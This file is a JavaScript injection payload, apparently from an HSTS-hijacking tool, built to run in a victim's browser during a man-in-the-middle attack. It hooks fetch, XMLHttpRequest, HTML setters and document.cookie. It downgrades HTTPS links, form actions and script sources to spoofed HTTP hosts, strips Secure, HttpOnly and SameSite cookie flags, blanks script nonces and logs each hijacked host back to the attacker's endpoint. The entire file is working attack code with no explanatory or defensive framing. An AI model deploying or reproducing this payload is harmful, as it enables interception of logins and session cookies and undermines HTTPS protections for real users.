(async () => {
	const obf_hstshijack_rx_one = /\-/g,
		obf_hstshijack_rx_two = /^\*./,
		obf_hstshijack_rx_three = /^\*\./,
		obf_hstshijack_rx_four = /\./g,
		obf_hstshijack_rx_five = /^\*\./,
		obf_hstshijack_rx_six = /\.\*$/,
		obf_hstshijack_rx_seven = /\.\*/g,
		obf_hstshijack_rx_eight = /^((?:[a-z0-9.+-]{1,256}[:])(?:[/][/])?|(?:[a-z0-9.+-]{1,256}[:])?[/][/])?.*$/i,
		obf_hstshijack_rx_nine = /^((?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.){1,63}(?:[a-z]{1,63})|(?:25[0-5]|2[0-4][0-9]|[1][0-9][0-9]|[1-9]?[0-9])\.(?:25[0-5]|2[0-4][0-9]|[1][0-9][0-9]|[1-9]?[0-9])\.(?:25[0-5]|2[0-4][0-9]|[1][0-9][0-9]|[1-9]?[0-9])\.(?:25[0-5]|2[0-4][0-9]|[1][0-9][0-9]|[1-9]?[0-9]))?.*$/i,
		obf_hstshijack_rx_ten = /^([:](?:6553[0-5]|655[0-2][0-9]|65[0-4][0-9][0-9]|6[0-4][0-9][0-9][0-9]|[0-5][0-9][0-9][0-9][0-9]|[1-9][0-9]{0,3}))?.*$/i,
		obf_hstshijack_rx_eleven = /^([^?#]{1,2048})?.*$/i,
		obf_hstshijack_rx_twelve = /^([?][^#]{0,2048})?.*$/i,
		obf_hstshijack_rx_thirteen = /^\s*(.*)\s*$/g,
		obf_hstshijack_rx_fourteen = /^\s*(?:http[s]?:)?\/\/[^:/?#]+/i,
		obf_hstshijack_rx_fifteen = /(http)s:\/\//i,
		obf_hstshijack_rx_sixteen = /^:443$/,
		obf_hstshijack_rx_seventeen = /^(?:about|data|file|geo|javascript|tel):$/i,
		obf_hstshijack_rx_eighteen = /=['"]?(?:http[s]?:)?\/\/[a-z0-9-.]+/ig,
		obf_hstshijack_rx_nineteen = /^.*\/\//,
		obf_hstshijack_rx_cookie_host_prefix = /^__Host-/ig,
		obf_hstshijack_rx_cookie_secure_prefix = /^__Secure-/ig,
		obf_hstshijack_rx_cookie_downgrade = /;\s*(?:httponly|partitioned|samesite|secure)(?:=[^;]+)?/ig,
		obf_hstshijack_rx_cookie_domain = /;\s*domain=([^;\s]+)/i;

	const obf_hstshijack_xhrOpen = XMLHttpRequest.prototype.open,
		obf_hstshijack_XMLHttpRequest = new XMLHttpRequest(),
		obf_hstshijack_fetch = globalThis.fetch,
		obf_hstshijack_callback_log = [],
		obf_hstshijack_innerHtmlSetter = Object.getOwnPropertyDescriptor(Element.prototype, "innerHTML").set,
		obf_hstshijack_outerHtmlSetter = Object.getOwnPropertyDescriptor(Element.prototype, "outerHTML").set,
		obf_hstshijack_scriptSrcSetter = Object.getOwnPropertyDescriptor(HTMLScriptElement.prototype, "src").set,
		obf_hstshijack_linkHrefSetter = Object.getOwnPropertyDescriptor(HTMLLinkElement.prototype, "href").set;

	const obf_hstshijack_sleep = obf_hstshijack_ms => new Promise(obf_hstshijack_res => setTimeout(obf_hstshijack_res, obf_hstshijack_ms));

	const obf_hstshijack_mutation_observer = new MutationObserver(function(obf_hstshijack_mutations) {
		obf_hstshijack_mutations.forEach(function(obf_hstshijack_mutation) {
			if (obf_hstshijack_mutation.type === "childList") {
				obf_hstshijack_mutation.addedNodes.forEach(function(obf_hstshijack_node) {
					switch (obf_hstshijack_node.tagName) {
					case "A" || "LINK":
						if (obf_hstshijack_node.href) {
							var obf_hstshijack_url = obf_hstshijack_node.href;
							if (obf_hstshijack_rx_fourteen.test(obf_hstshijack_url)) {
								var obf_hstshijack_hijacked_url = obf_hstshijack_hijackUrl(obf_hstshijack_url);
								if (obf_hstshijack_hijacked_url !== obf_hstshijack_url) {
									obf_hstshijack_node.href = obf_hstshijack_hijacked_url;
								}
							}
						}
						break;
					case "FORM":
						if (obf_hstshijack_node.action) {
							var obf_hstshijack_url = obf_hstshijack_node.action;
							if (obf_hstshijack_rx_fourteen.test(obf_hstshijack_url)) {
								var obf_hstshijack_hijacked_url = obf_hstshijack_hijackUrl(obf_hstshijack_url);
								if (obf_hstshijack_hijacked_url !== obf_hstshijack_url) {
									obf_hstshijack_node.action = obf_hstshijack_hijacked_url;
								}
							}
						}
						break;
					case "SCRIPT" || "FRAME":
						if (obf_hstshijack_node.src) {
							var obf_hstshijack_url = obf_hstshijack_node.src;
							if (obf_hstshijack_rx_fourteen.test(obf_hstshijack_url)) {
								var obf_hstshijack_hijacked_url = obf_hstshijack_hijackUrl(obf_hstshijack_url);
								if (obf_hstshijack_hijacked_url !== obf_hstshijack_url) {
									obf_hstshijack_node.src = obf_hstshijack_hijacked_url;
								}
							}
						}
						break;
					}
				});
			} else if (obf_hstshijack_mutation.type === "attributes") {
				switch (obf_hstshijack_mutation.target.tagName) {
				case "A" || "LINK":
					if (obf_hstshijack_mutation.attributeName === "href") {
						var obf_hstshijack_url = obf_hstshijack_mutation.target.href;
						if (obf_hstshijack_rx_fourteen.test(obf_hstshijack_url)) {
							var obf_hstshijack_hijacked_url = obf_hstshijack_hijackUrl(obf_hstshijack_url);
							if (obf_hstshijack_hijacked_url !== obf_hstshijack_url) {
								obf_hstshijack_mutation.target.href = obf_hstshijack_hijacked_url;
							}
						}
					}
					break;
				case "FORM":
					if (obf_hstshijack_mutation.attributeName === "action") {
						var obf_hstshijack_url = obf_hstshijack_mutation.target.action;
						if (obf_hstshijack_rx_fourteen.test(obf_hstshijack_url)) {
							var obf_hstshijack_hijacked_url = obf_hstshijack_hijackUrl(obf_hstshijack_url);
							if (obf_hstshijack_hijacked_url !== obf_hstshijack_url) {
								obf_hstshijack_mutation.target.action = obf_hstshijack_hijacked_url;
							}
						}
					}
					break;
				case "SCRIPT" || "IFRAME":
					if (obf_hstshijack_mutation.attributeName === "src") {
						var obf_hstshijack_url = obf_hstshijack_mutation.target.src;
						if (obf_hstshijack_rx_fourteen.test(obf_hstshijack_url)) {
							var obf_hstshijack_hijacked_url = obf_hstshijack_hijackUrl(obf_hstshijack_url);
							if (obf_hstshijack_hijacked_url !== obf_hstshijack_url) {
								obf_hstshijack_mutation.target.src = obf_hstshijack_hijacked_url;
							}
						}
					}
					break;
				}
			}
		});
	});

	const obf_hstshijack_trimLeadingAndTrailingWhitespaces = obf_hstshijack_str => {
		return obf_hstshijack_str.replace(obf_hstshijack_rx_thirteen, "$1");
	};

	const obf_hstshijack_toWholeRegexpSet = (obf_hstshijack_selector_string, obf_hstshijack_replacement_string) => {
		if (obf_hstshijack_selector_string.indexOf("*") != -1) {
			obf_hstshijack_selector_string = obf_hstshijack_selector_string.replace(
				obf_hstshijack_rx_one, "\\-");
			if (obf_hstshijack_rx_two.test(obf_hstshijack_selector_string)) {
				obf_hstshijack_selector_string = obf_hstshijack_selector_string.replace(
					obf_hstshijack_rx_three, "((?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?.)+)");
				obf_hstshijack_selector_string = obf_hstshijack_selector_string.replace(
					obf_hstshijack_rx_four, "\\.");
				obf_hstshijack_replacement_string = obf_hstshijack_replacement_string.replace(
					obf_hstshijack_rx_five, "");
				return [
					new RegExp("^" + obf_hstshijack_selector_string + "$", "ig"),
					"$1" + obf_hstshijack_replacement_string
				];
			} else if (obf_hstshijack_rx_six.test(obf_hstshijack_selector_string)) {
				obf_hstshijack_selector_string = obf_hstshijack_selector_string.replace(
					obf_hstshijack_rx_seven, "((?:.[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?)+)");
				obf_hstshijack_selector_string = obf_hstshijack_selector_string.replace(
					obf_hstshijack_rx_four, "\\.");
				obf_hstshijack_replacement_string = obf_hstshijack_replacement_string.replace(
					obf_hstshijack_rx_six, "");
				return [
					new RegExp(obf_hstshijack_selector_string, "ig"),
					obf_hstshijack_replacement_string + "$1"
				];
			}
		} else {
			obf_hstshijack_selector_string = obf_hstshijack_selector_string
				.replace(obf_hstshijack_rx_four, "\\.")
				.replace(/\-/g, "\\-");
			return [
				new RegExp("^" + obf_hstshijack_selector_string + "$", "ig"),
				obf_hstshijack_replacement_string
			];
		}
	};

	const obf_hstshijack_parseURL = obf_hstshijack_url => {
		if (typeof obf_hstshijack_url !== "string") return obf_hstshijack_url;
		var obf_hstshijack_sliceLength = 0;
		var obf_hstshijack_strippedURL = obf_hstshijack_trimLeadingAndTrailingWhitespaces(obf_hstshijack_url);
		var obf_hstshijack_retval = ["","","","","",""];
		/* obf_protocol */
		obf_hstshijack_retval[0] = obf_hstshijack_strippedURL.replace(obf_hstshijack_rx_eight, "$1");
		var obf_hstshijack_protocol = obf_hstshijack_retval[0].toLowerCase();
		if (obf_hstshijack_protocol.length !== 0) {
			if (obf_hstshijack_rx_seventeen.test(obf_hstshijack_protocol)) {
				obf_hstshijack_retval[3] = obf_hstshijack_strippedURL.slice(obf_hstshijack_protocol.length);
				return obf_hstshijack_retval;
			}
			/* obf_host */
			obf_hstshijack_retval[1] = obf_hstshijack_strippedURL.slice(obf_hstshijack_protocol).replace(
				obf_hstshijack_rx_nine, "$1");
		}
		/* obf_port */
		obf_hstshijack_sliceLength = obf_hstshijack_protocol.length + obf_hstshijack_retval[1].length;
		obf_hstshijack_retval[2] = obf_hstshijack_strippedURL.slice(obf_hstshijack_sliceLength).replace(
			obf_hstshijack_rx_ten, "$1");
		/* obf_path */
		obf_hstshijack_sliceLength = obf_hstshijack_sliceLength + obf_hstshijack_retval[2].length;
		obf_hstshijack_retval[3] = obf_hstshijack_strippedURL.slice(obf_hstshijack_sliceLength).replace(
			obf_hstshijack_rx_eleven, "$1");
		/* obf_search */
		obf_hstshijack_sliceLength = obf_hstshijack_sliceLength + obf_hstshijack_retval[3].length;
		obf_hstshijack_retval[4] = obf_hstshijack_strippedURL.slice(obf_hstshijack_sliceLength).replace(
			obf_hstshijack_rx_twelve, "$1");
		/* obf_hash */
		obf_hstshijack_retval[5] = obf_hstshijack_strippedURL.slice(
			obf_hstshijack_sliceLength + obf_hstshijack_retval[4].length);
		return obf_hstshijack_retval;
	};

	const obf_hstshijack_sendCallback = obf_hstshijack_host => {
		if (obf_hstshijack_callback_log.indexOf(obf_hstshijack_host) !== -1) {
			return;
		}
		obf_hstshijack_callback_log.push(obf_hstshijack_host);
		var obf_hstshijack_url = location.origin + "/obf_path_ssl_log?" + obf_hstshijack_host;
		if (obf_hstshijack_fetch) {
			obf_hstshijack_fetch(obf_hstshijack_url)
		} else {
			var obf_hstshijack_request = new obf_hstshijack_XMLHttpRequest();
			obf_hstshijack_request.open("GET", obf_hstshijack_url, true);
			obf_hstshijack_request.send();
		}
	};

	const obf_hstshijack_hijackHost = obf_hstshijack_host => {
		for (
			let obf_hstshijack_i = 0;
			obf_hstshijack_i < obf_hstshijack_target_hosts.length;
			obf_hstshijack_i++
		) {
			const obf_hstshijack_whole_rx_set = obf_hstshijack_toWholeRegexpSet(
				obf_hstshijack_target_hosts[obf_hstshijack_i],
				obf_hstshijack_replacement_hosts[obf_hstshijack_i]);
			obf_hstshijack_whole_rx_set[0].lastIndex = 0;
			if (obf_hstshijack_whole_rx_set[0].test(obf_hstshijack_host)) {
				obf_hstshijack_host = obf_hstshijack_host.replace(
					obf_hstshijack_whole_rx_set[0], obf_hstshijack_whole_rx_set[1]);
				break;
			}
		}
		return obf_hstshijack_host;
	};

	const obf_hstshijack_hijackUrl = obf_hstshijack_url => {
		const obf_hstshijack_parsed_url = obf_hstshijack_parseURL(obf_hstshijack_url);
		const obf_hstshijack_host = obf_hstshijack_parsed_url[1];
		const obf_hstshijack_hijacked_host = obf_hstshijack_hijackHost(obf_hstshijack_host);
		if (obf_hstshijack_hijacked_host !== obf_hstshijack_host) {
			obf_hstshijack_parsed_url[1] = obf_hstshijack_hijacked_host;
			const obf_hstshijack_protocol = obf_hstshijack_parsed_url[0];
			if (obf_hstshijack_rx_fifteen.test(obf_hstshijack_protocol)) {
				obf_hstshijack_parsed_url[0] = obf_hstshijack_protocol.replace(
					obf_hstshijack_rx_fifteen, "$1://");
			}
			if (obf_hstshijack_rx_sixteen.test(obf_hstshijack_parsed_url[2])) {
				obf_hstshijack_parsed_url[2] = "";
			}
			return obf_hstshijack_parsed_url.join("");
		}
		return obf_hstshijack_url;
	};

	const obf_hstshijack_hijackHtml = obf_hstshijack_html => {
		const obf_hstshijack_url_matches = obf_hstshijack_html.match(obf_hstshijack_rx_eighteen) || [];
		for (const obf_hstshijack_match of obf_hstshijack_url_matches) {
			const obf_hstshijack_host = obf_hstshijack_match.replace(obf_hstshijack_rx_nineteen, "");
			const obf_hstshijack_spoofed_host = obf_hstshijack_hijackHost(obf_hstshijack_host);
			if (obf_hstshijack_host !== obf_hstshijack_spoofed_host) {
				const obf_hstshijack_spoofed_html = obf_hstshijack_match.replace(
					obf_hstshijack_host,
					obf_hstshijack_spoofed_host);
				obf_hstshijack_html = obf_hstshijack_html.replace(
					obf_hstshijack_match,
					obf_hstshijack_spoofed_html);
			}
		}
		return obf_hstshijack_html;
	};

	const obf_hstshijack_hookCookieGetterAndSetter = async () => {
		while (document === undefined) await obf_hstshijack_sleep(0);
		const obf_hstshijack_originalCookieGetter = Object.getOwnPropertyDescriptor(Document.prototype, "cookie").get,
			obf_hstshijack_originalCookieSetter = Object.getOwnPropertyDescriptor(Document.prototype, "cookie").set;
		Object.defineProperty(document, "cookie", {
			configurable: true,
			get: () => obf_hstshijack_originalCookieGetter.call(document)
				.replaceAll("obf_hstshijack_cookie_host_prefix", "__Host-")
				.replaceAll("obf_hstshijack_cookie_secure_prefix", "__Secure-"),
			set: obf_hstshijack_value => {
				obf_hstshijack_rx_cookie_domain.lastIndex = 0;
				if (obf_hstshijack_rx_cookie_domain.test(obf_hstshijack_value)) {
					const obf_hstshijack_cookie_domain = obf_hstshijack_value.match(obf_hstshijack_rx_cookie_domain)[1];
					const obf_hstshijack_selector_string = obf_hstshijack_cookie_domain[0] === "."
						? "*" + obf_hstshijack_cookie_domain : obf_hstshijack_cookie_domain;
					if (obf_hstshijack_selector_string[0] === "*") {
						for (obf_hstshijack_a = 0; obf_hstshijack_a < obf_hstshijack_target_hosts.length; obf_hstshijack_a++) {
							if (obf_hstshijack_selector_string === obf_hstshijack_target_hosts[obf_hstshijack_a]) {
								obf_hstshijack_value = obf_hstshijack_value.replace(
									obf_hstshijack_cookie_domain,
									obf_hstshijack_replacement_hosts[obf_hstshijack_a]);
								break;
							} else {
								const obf_hstshijack_unspoofed_domain = "a" + obf_hstshijack_cookie_domain;
								const obf_hstshijack_spoofed_domain = obf_hstshijack_hijackHost(obf_hstshijack_unspoofed_domain);
								if (obf_hstshijack_unspoofed_domain !== obf_hstshijack_spoofed_domain) {
									obf_hstshijack_value = obf_hstshijack_value.replace(
										obf_hstshijack_cookie_domain,
										obf_hstshijack_spoofed_domain.slice(1));
									break;
								}
							}
						}
					} else {
						for (obf_hstshijack_a = 0; obf_hstshijack_a < obf_hstshijack_target_hosts.length; obf_hstshijack_a++) {
								const obf_hstshijack_spoofed_domain = obf_hstshijack_hijackHost(obf_hstshijack_cookie_domain);
								if (obf_hstshijack_cookie_domain !== obf_hstshijack_spoofed_domain) {
									obf_hstshijack_value = obf_hstshijack_value.replace(
										obf_hstshijack_cookie_domain,
										obf_hstshijack_spoofed_domain);
									break;
								}
						}
					}
				}
				obf_hstshijack_originalCookieSetter.call(document, obf_hstshijack_value
					.replace(obf_hstshijack_rx_cookie_host_prefix, "obf_hstshijack_cookie_host_prefix")
					.replace(obf_hstshijack_rx_cookie_secure_prefix, "obf_hstshijack_cookie_secure_prefix")
					.replace(obf_hstshijack_rx_cookie_downgrade, ""))
			},
		});
	};

	const obf_hstshijack_hookHtmlSetters = () => {
		Object.defineProperty(Element.prototype, "innerHTML", {
			configurable: true,
			set: function(obf_hstshijack_html) {
				obf_hstshijack_innerHtmlSetter.call(
					this,
					obf_hstshijack_hijackHtml(obf_hstshijack_html));
			},
		});
		Object.defineProperty(Element.prototype, "outerHTML", {
			configurable: true,
			set: function(obf_hstshijack_html) {
				obf_hstshijack_outerHtmlSetter.call(
					this,
					obf_hstshijack_hijackHtml(obf_hstshijack_html));
			},
		});
	};

	const obf_hstshijack_hookLinkHrefSetter = () => {
		Object.defineProperty(HTMLLinkElement.prototype, "href", {
			configurable: true,
			set: function() {
				obf_hstshijack_linkHrefSetter.call(this, "");
			},
		});
	};

	const obf_hstshijack_hookScriptNonceSetter = () => {
		Object.defineProperty(HTMLScriptElement.prototype, "nonce", {
			configurable: true,
			set: function() {
				this.setAttribute("nonce", "");
			},
		});
	};

	const obf_hstshijack_hookScriptSrcSetter = () => {
		Object.defineProperty(HTMLScriptElement.prototype, "src", {
			configurable: true,
			set: function(obf_hstshijack_url) {
				obf_hstshijack_scriptSrcSetter.call(
					this,
					obf_hstshijack_hijackUrl(obf_hstshijack_url));
			},
		});
	};

	const obf_hstshijack_hookXMLHttpRequest = () => {
		globalThis.XMLHttpRequest.prototype.open = function(
			obf_hstshijack_method,
			obf_hstshijack_url,
			obf_hstshijack_async,
			obf_hstshijack_username,
			obf_hstshijack_password
		) {
			obf_hstshijack_url = obf_hstshijack_hijackUrl(obf_hstshijack_url);
			return obf_hstshijack_xhrOpen.apply(this, arguments);
		}
	};

	const obf_hstshijack_hookFetch = () => {
		globalThis.fetch = function(obf_hstshijack_resource, obf_hstshijack_options) {
			return obf_hstshijack_fetch(obf_hstshijack_hijackUrl(obf_hstshijack_resource), obf_hstshijack_options);
		}
	};

	try {
		obf_hstshijack_hookCookieGetterAndSetter();
	} catch(obf_hstshijack_ignore) {}

	try {
		obf_hstshijack_hookHtmlSetters();
	} catch(obf_hstshijack_ignore) {}

	try {
		obf_hstshijack_hookLinkHrefSetter();
	} catch(obf_hstshijack_ignore) {}

	try {
		obf_hstshijack_hookScriptNonceSetter();
	} catch(obf_hstshijack_ignore) {}

	try {
		obf_hstshijack_hookScriptSrcSetter();
	} catch(obf_hstshijack_ignore) {}

	try {
		obf_hstshijack_hookXMLHttpRequest();
	} catch(obf_hstshijack_ignore) {}

	try {
		obf_hstshijack_hookFetch();
	} catch(obf_hstshijack_ignore) {}

	try {
		while (document === undefined) await obf_hstshijack_sleep(0);
		obf_hstshijack_mutation_observer.observe(document.documentElement, {
			childList: true,
			subtree: true,
			attributes: true,
		});
	} catch(obf_hstshijack_ignore) {}
})().catch(() => {});

